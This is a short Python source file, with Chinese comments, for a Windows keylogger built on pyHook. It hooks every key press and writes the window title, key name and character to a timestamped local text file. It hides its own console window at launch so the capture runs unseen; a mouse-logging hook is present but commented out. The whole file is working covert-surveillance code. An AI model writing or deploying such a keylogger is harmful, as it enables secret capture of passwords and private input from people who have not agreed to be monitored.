#!/usr/bin/env python
# -*- coding: utf-8 -*-


import pythoncom
import pyHook
import time
import ctypes

def onMouseEvent(event):
    "处理鼠标事件"
    fobj.writelines('-' * 20 + 'MouseEvent Begin' + '-' * 20 + '\n')
    fobj.writelines("Current Time:%s\n" % time.strftime("%a, %d %b %Y %H:%M:%S", time.gmtime()))
    fobj.writelines("MessageName:%s\n" % str(event.MessageName))
    fobj.writelines("Message:%d\n" % event.Message)
    fobj.writelines("Time_sec:%d\n" % event.Time)
    fobj.writelines("Window:%s\n" % str(event.Window))
    fobj.writelines("WindowName:%s\n" % str(event.WindowName))
    fobj.writelines("Position:%s\n" % str(event.Position))
    fobj.writelines('-' * 20 + 'MouseEvent End' + '-' * 20 + '\n')
    return True


def onKeyboardEvent(event): 
    "处理键盘事件"   
    fobj.writelines('-' * 20 + 'Keyboard Begin' + '-' * 20 + '\n')
    fobj.writelines("Current Time:%s\n" % time.strftime("%a, %d %b %Y %H:%M:%S", time.gmtime()))
    fobj.writelines("MessageName:%s\n" % str(event.MessageName))
    fobj.writelines("Message:%d\n" % event.Message)
    fobj.writelines("Time:%d\n" % event.Time)
    fobj.writelines("Window:%s\n" % str(event.Window))
    fobj.writelines("WindowName:%s\n" % str(event.WindowName))
    fobj.writelines("Ascii_code: %d\n" % event.Ascii)
    fobj.writelines("Ascii_char:%s\n" % chr(event.Ascii))
    fobj.writelines("Key:%s\n" % str(event.Key))
    fobj.writelines('-' * 20 + 'Keyboard End' + '-' * 20 + '\n')
    return True




if __name__ == "__main__":
    whnd = ctypes.windll.kernel32.GetConsoleWindow()    
    if whnd != 0:    
        ctypes.windll.user32.ShowWindow(whnd, 0)    
        ctypes.windll.kernel32.CloseHandle(whnd)   

        
    #打开日志文件
    file_name = str(time.time()).split('.')[0]+".txt"
    fobj = open(file_name,  'w')       


    #创建hook句柄
    hm = pyHook.HookManager()


    #监控键盘
    hm.KeyDown = onKeyboardEvent
    hm.HookKeyboard()


    #监控鼠标
    #hm.MouseAll = onMouseEvent
    #hm.HookMouse()
    
    #循环获取消息
    pythoncom.PumpMessages()
    
    #关闭日志文件
    fobj.close() 
